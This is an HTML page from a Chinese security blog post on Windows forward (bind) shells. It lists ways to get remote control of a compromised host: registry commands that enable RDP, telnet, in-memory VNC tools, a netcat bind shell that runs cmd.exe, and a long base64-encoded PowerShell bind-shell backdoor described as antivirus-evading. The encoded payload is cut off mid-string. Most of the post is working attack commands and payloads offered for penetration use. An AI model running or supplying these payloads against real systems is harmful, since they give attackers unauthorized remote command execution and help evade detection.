@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+(function(){
+ if(''){
+ if (prompt('请输入文章密码') !== ''){
+                 alert('密码错误！');
+                                 history.back();
+                                             
+ }
+         
+ }
+     
+ })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-mac-osx.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="v1rus blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x00 简介shell： 在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。 它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。 正向shell：被控端监听端口，控制端主动发起连接去连接被控端。 反向shell：控制端监听端口，被控端主动发起连接去连接控制端。  在渗透环境中，通常由于被控端因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell&#x2F;windows&#x2F;正向shell">
+<meta property="og:url" content="https://virusday.github.io/2021/03/17/%E5%8F%8D%E5%BC%B9shell/windows/%E6%AD%A3%E5%90%91shell/index.html">
+<meta property="og:site_name" content="v1rus blog">
+<meta property="og:description" content="0x00 简介shell： 在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。 它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。 正向shell：被控端监听端口，控制端主动发起连接去连接被控端。 反向shell：控制端监听端口，被控端主动发起连接去连接控制端。  在渗透环境中，通常由于被控端因">
+<meta property="og:image" content="https://virusday.github.io/2021/03/17/%E5%8F%8D%E5%BC%B9shell/windows/%E6%AD%A3%E5%90%91shell/640.png">
+<meta property="article:published_time" content="2021-03-17T07:39:45.958Z">
+<meta property="article:modified_time" content="2021-03-17T08:04:16.838Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2021/03/17/%E5%8F%8D%E5%BC%B9shell/windows/%E6%AD%A3%E5%90%91shell/640.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2021/03/17/反弹shell/windows/正向shell/"/>
+
+
+
+
+
+  <title>反弹shell/windows/正向shell | v1rus blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1rus blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2021/03/17/%E5%8F%8D%E5%BC%B9shell/windows/%E6%AD%A3%E5%90%91shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1rus blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反弹shell/windows/正向shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-17T15:39:45+08:00">
+                2021-03-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2021-03-17T16:04:16+08:00">
+                2021-03-17
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>shell：</p>
+<p>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。</p>
+<p>它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
+<p>正向shell：被控端监听端口，控制端主动发起连接去连接被控端。</p>
+<p>反向shell：控制端监听端口，被控端主动发起连接去连接控制端。</p>
+<p> 在渗透环境中，通常由于被控端因防火墙受限、权限不足、端口被占用等情形。 会导致通常进入被控制端的数据包会被拦截等原因的无法连接。 而被控制端主动向外发送的数据包通常都不会被拦截。</p>
+<p> 因此，在渗透过程中反向shell更加符合实战的条件。但是，渗透的环境是不确定的，因此我们也要需要了解一下正向shell的实现，丰富我们的攻击。</p>
+<p> 个人认为在windows下使用非原生工具的反向或正向shell有些鸡肋，需要进一步升级为cs等的多功能shellcode才有利于更一步进攻。</p>
+<p><img src="/2021/03/17/%E5%8F%8D%E5%BC%B9shell/windows/%E6%AD%A3%E5%90%91shell/640.png" alt="图片"></p>
+<p>由于内容比较多，所以我也没有进行完整的研究，只出一个提纲，大家有兴趣的可以自己深入了解。</p>
+<h1 id="0x01-正片"><a href="#0x01-正片" class="headerlink" title="0x01 正片"></a>0x01 正片</h1><h3 id="0x01-RDP-GUI"><a href="#0x01-RDP-GUI" class="headerlink" title="0x01 RDP GUI"></a><strong>0x01</strong> <strong>RDP GUI</strong></h3><p>Windows远程桌面管理服务,默认的是3389端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注册表开启RDP远程桌面HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server下的&quot;fDenyTSConnections&quot;&#x3D;dword:00000001</span><br><span class="line">#这个值对于没开远程桌面的是1，已开的是0</span><br><span class="line"></span><br><span class="line">#cmd开启RDP服务</span><br><span class="line">reg add    &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0             </span><br><span class="line">#&#x2F;v值名称是fDenyTsConnections &#x2F;t值类型是REG_DWORD &#x2F;d数据是0</span><br><span class="line"></span><br><span class="line">#cmd关闭RDP服务</span><br><span class="line">reg delete &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot; &#x2F;F</span><br><span class="line">#&#x2F;F 表示强制删除不询问 force</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-telnet远程连接"><a href="#0x02-telnet远程连接" class="headerlink" title="0x02 telnet远程连接"></a><strong>0x02</strong> <strong>telnet远程连接</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、安装telnet服务端和客户端       打开控制面板—&gt;程序—&gt;打开或关闭Windows功能</span><br><span class="line">2、被控端开启telnet服务：        net start telnet3、控制端：telnet 远程IP</span><br></pre></td></tr></table></figure>
+
+<p>#win10新版Windows功能里面好像没有telnet服务端这个选项,应该有其他的开启方式。</p>
+<p>类似还可以使用windows横向移动的常见方式(WMI、PStools、winRM、winRS)等方法进行远程管理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winRM横向移动参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;lhh134&#x2F;article&#x2F;details&#x2F;104333583</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="0x03-VNC-GUI"><a href="#0x03-VNC-GUI" class="headerlink" title="0x03 VNC GUI"></a><strong>0x03</strong> <strong>VNC GUI</strong></h3><p>​    VNC是类似RDP远程桌面的图形化远程管理工具,服务端支持<strong>正向监听</strong>和<strong>反向连接客户端</strong>。CS自带了编译为vncdll的vnc服务端。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-Vnc</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;klsecservices&#x2F;Invoke-Vnc</span><br><span class="line">#powershell在内存中执行VNC反向连接或绑定到指定端口。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jsmpeg-vnc</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;phoboslab&#x2F;jsmpeg-vnc</span><br><span class="line">#免安装的VNC服务器和客户端，可在用浏览器作为客户端控制</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tightvnc 免安装版#免安装的VNC服务端和客户端</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x04-netcat正向shell"><a href="#0x04-netcat正向shell" class="headerlink" title="0x04 netcat正向shell"></a><strong>0x04</strong> netcat正向shell</h3><p>被攻击服务器执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 44444 -vv -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>攻击主机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.88.1 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PS：NC不免杀，可以尝试使用ncat、socat、 cryptcat、gonc、…等等工具进行替代。</p>
+<h3 id="0x05-powershell-bind"><a href="#0x05-powershell-bind" class="headerlink" title="0x05 powershell bind"></a><strong>0x05</strong> <strong>powershell bind</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-reverse-tcp</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ivan-sincek&#x2F;powershell-reverse-tcp包含正向bind与反向shell的powershell脚本。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#powershell_bind_tcp_manual.ps1 免杀</span><br><span class="line">#powershell_bind_tcp_manual.ps1.bat 免杀PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABwAG8AcgB0ACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAiACkALgBUAHIAaQBtACgAKQA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABvAHIAdAAgAG4AdQBtAGIAZQByACAAaQBzACAAcgBlAHEAdQBpAHIAZQBkACIAOwANAAoAfQAgAGUAbABzAGUAIAB7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAEIAaQBuAGQAIABUAEMAUAAgAHYAMQAuADEAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABGAGUAZQBsACAAZgByAGUAZQAgAHQAbwAgAGQAbwBuAGEAdABlACAAYgBpAHQAYwBvAGkAbgAgAGEAdAAgADEAQgByAFoATQA2AFQANwBHADkAUgBOADgAdgBiAGEAYgBuAGYAWAB1ADQATQA2AEwAcABnAHoAdABxADYAWQAxADQALgAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIgA7AA0ACgAJACQAbABpAHMAdABlAG4AZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABzAHQAcgBlAGEAbQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAGIAdQBmAGYAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAdwByAGkAdABlAHIAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABkAGEAdABhACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcgBlAHMAdQBsAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAdAByAHkAIAB7AA0ACgAJAAkAIwAgAGMAaABhAG4AZwBlACAAdABoAGUAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABhAHMAIABuAGUAYwBlAHMAcwBhAHIAeQANAAoACQAJACQAbABpAHMAdABlAG4AZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAKAAiADAALgAwAC4AMAAuADAAIgAsACAAJABwAG8AcgB0ACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AGEAcgB0ACgAKQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFcAYQBpAHQAaQBuAGcAIABmAG8AcgAgAGMAbABpAGUAbgB0ACAAdABvACAAYwBvAG4AbgBlAGMAdAAuAC4ALgAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAAkACQBkAG8AIAB7AA0ACgAJAAkACQAjACAAbgBvAG4ALQBiAGwAbwBjAGsAaQBuAGcAIABtAGUAdABoAG8AZAANAAoACQAJAAkAaQBmACAAKAAkAGwAaQBzAHQAZQBuAGUAcgAuAFAAZQBuAGQAaQBuAGcAKAApACkAIAB7AA0ACgAJAAkACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwANAAoACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7AA0ACgAJAAkACQB9AA0ACgAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABjAGwAaQBlAG4AdAAgAC0AZQBxACAAJABuAHUAbABsACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwANAAoACQAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AA0ACgAJAAkAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAxADAAMgA0ADsADQAKAAkACQAkAGUAbgBjAG8AZABpAG4AZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwANAAoACQAJACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApADsADQAKAAkACQAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGMAbwBuAG4AZQBjAHQAZQBkACEAIgA7AA0ACgAJAAkAJABiAHkAdABlAHMAIAA9ACAAMAA7AA0ACgAJAAkAZABvACAAewANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQAoACIAUABTAD4AIgApADsADQAKAAkACQAJAGQAbwAgAHsADQAKAAkACQAJAAkAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQA7AA0ACgAJAAkACQAJAGkAZgAgACgAJABiAHkAdABlAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhACAAKwAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwApADsADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABzAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7AA0ACgAJAAkACQBpAGYAIAAoACQAZABhAHQAYQAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAHQAcgB5ACAAewANAAoACQAJAAkACQAJACQAcgBlAHMAdQBsAHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnADsADQAKAAkACQAJAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ASQBuAG4AZQByAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJAByAGUAcwB1AGwAdAApADsADQAKAAkACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAAkAfQANAAoACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJAB3AHIAaQB0AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcwB0AHIAZQBhAG0AIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGMAbABpAGUAbgB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABiAHUAZgBmAGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAGIAdQBmAGYAZQByAC4AQwBsAGUAYQByACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHIAZQBzAHUAbAB0ACAALQBuAGUAIAAkAG4AdQBs